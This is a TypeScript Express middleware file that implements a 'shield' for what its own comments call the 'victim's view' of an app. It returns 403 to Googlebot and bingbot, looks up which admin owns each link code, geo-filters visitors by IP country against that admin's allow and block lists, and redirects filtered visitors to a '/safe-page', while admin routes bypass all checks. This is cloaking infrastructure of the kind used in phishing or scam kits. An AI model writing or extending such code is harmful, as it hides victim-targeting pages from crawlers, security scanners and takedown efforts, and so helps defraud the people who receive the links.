
import { Request, Response, NextFunction } from 'express';
import geoip from 'geoip-lite';
import { getLinkByCode, getUserByCode, getUserById } from './db';

const getClientIp = (req: Request) => {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (typeof xForwardedFor === 'string') {
        return xForwardedFor.split(',')[0].trim();
    } else if (Array.isArray(xForwardedFor)) {
        return xForwardedFor[0].trim();
    }
    return req.socket.remoteAddress || '127.0.0.1';
};

const getIpCountry = (ip: string) => {
    // Localhost / LAN fallback
    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.')) return 'XX';
    const geo = geoip.lookup(ip);
    return geo ? geo.country : 'XX';
};

export const shieldMiddleware = async (req: Request, res: Response, next: NextFunction) => {
    // 1. Bot Protection (Simplified for this task, assume existing logic)
    const ua = req.headers['user-agent'] || '';
    if (ua.includes('Googlebot') || ua.includes('bingbot')) {
        return res.status(403).send('Access Denied');
    }

    // 2. Geo-Blocking Logic
    // We only block the MAIN APP access, i.e., root or specific routes, not the API generally
    // unless we want to block API calls from blocked countries too (safer).
    // However, the dashboard /admin should NOT be geo-blocked typically, or maybe it should?
    // Requirement says "block selected countries from accessing the app (victim's view)".
    // Admin view should remain accessible usually.

    if (req.path.startsWith('/api/admin') || req.path.startsWith('/admin')) {
        return next(); // Bypass for Admin
    }

    // Identify the Admin associated with this request
    const id = req.query.id as string;
    let adminId: string | null = null;

    if (id) {
        // Try Link
        const link = await getLinkByCode(id);
        if (link) {
            adminId = link.adminId;
        } else {
            // Try User
            const user = await getUserByCode(id);
            if (user) {
                adminId = user.id;
            }
        }
    }

    // If we found an admin, check their settings
    if (adminId) {
        const user = await getUserById(adminId);
        if (user && user.settings) {
            try {
                const settings = JSON.parse(user.settings);
                const allowed = settings.allowedCountries || []; // Array of codes e.g. ['US', 'CA']
                const blocked = settings.blockedCountries || [];

                const ip = getClientIp(req);
                const country = getIpCountry(ip);

                // Block Logic
                if (blocked.length > 0 && blocked.includes(country)) {
                    console.log(`[Shield] Blocked ${ip} (${country}) due to Blacklist`);
                    return res.redirect('/safe-page'); // Or serve safe html
                }

                // Allow Logic (Whitelist) - If defined, MUST match
                if (allowed.length > 0 && !allowed.includes(country)) {
                    console.log(`[Shield] Blocked ${ip} (${country}) due to Whitelist mismatch`);
                    return res.redirect('/safe-page');
                }

            } catch (e) {
                console.error('[Shield] Settings parse error', e);
            }
        }
    }

    next();
};

export const verifyHandler = (req: Request, res: Response) => {
    res.json({ status: 'ok' });
};
